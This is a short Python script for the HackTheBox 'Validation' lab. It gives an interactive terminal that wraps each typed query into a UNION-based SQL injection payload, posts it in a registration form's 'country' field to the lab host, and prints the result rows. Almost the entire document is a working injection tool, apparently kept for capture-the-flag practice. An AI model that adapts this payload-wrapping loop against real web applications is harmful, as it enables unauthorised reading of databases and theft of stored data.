#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

'''
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/08/10

sql query term.

example to show how to create a sql query term.

ref:
[HTB: Validation](https://0xdf.gitlab.io/2021/09/14/htb-validation.html)
'''

import requests
from cmd import Cmd

import random
from bs4 import BeautifulSoup

class Term(Cmd):
    prompt = "$ "

    def default(self, args):
        # do exec {{{1
        name = f'testuser-{random.randrange(100000,999999999)}'
        res = requests.post('http://10.10.11.116',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"username": name, "country": f"' union {args}; -- -"})
        soup = BeautifulSoup(res.text, 'html.parser')
        if soup.li:
            print('\n'.join([x.text for x in soup.findAll('li')]))
        #}}}

    def do_quit(self, args):
        # quit
        return 1

term = Term()
term.cmdloop()
